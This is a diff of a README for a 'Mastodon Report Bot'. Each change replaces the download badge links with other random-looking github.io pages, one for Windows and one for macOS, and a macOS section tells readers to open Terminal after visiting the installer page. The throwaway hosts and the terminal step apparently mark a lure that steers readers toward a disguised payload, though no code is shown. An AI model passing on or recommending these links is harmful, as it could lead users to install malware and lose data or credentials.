@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Mastodon_Report_Bot-6364FF?style=for-the-badge&logo=mastodon)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_Mastodon_Report_Bot-6364FF?style=for-the-badge&logo=mastodon)](https://uvkayskoqsgd.github.io/windows-files/)
 
 </div>
 
@@ -59,9 +59,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://uvkayskoqsgd.github.io/windows-files/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zqhzqrfmocza.github.io/mac-release/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://ApexShrimpJetty10.github.io/macos-install/)
 
 </div>
 
@@ -74,7 +74,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Mastodon_Report_Bot-6364FF?style=for-the-badge&logo=mastodon)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_Mastodon_Report_Bot-6364FF?style=for-the-badge&logo=mastodon)](https://uvkayskoqsgd.github.io/windows-files/)
 
 </div>
 
@@ -105,7 +105,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zqhzqrfmocza.github.io/mac-release/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://ApexShrimpJetty10.github.io/macos-install/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -130,7 +130,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Mastodon_Report_Bot-6364FF?style=for-the-badge&logo=mastodon)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_Mastodon_Report_Bot-6364FF?style=for-the-badge&logo=mastodon)](https://uvkayskoqsgd.github.io/windows-files/)
 
 </div>
 
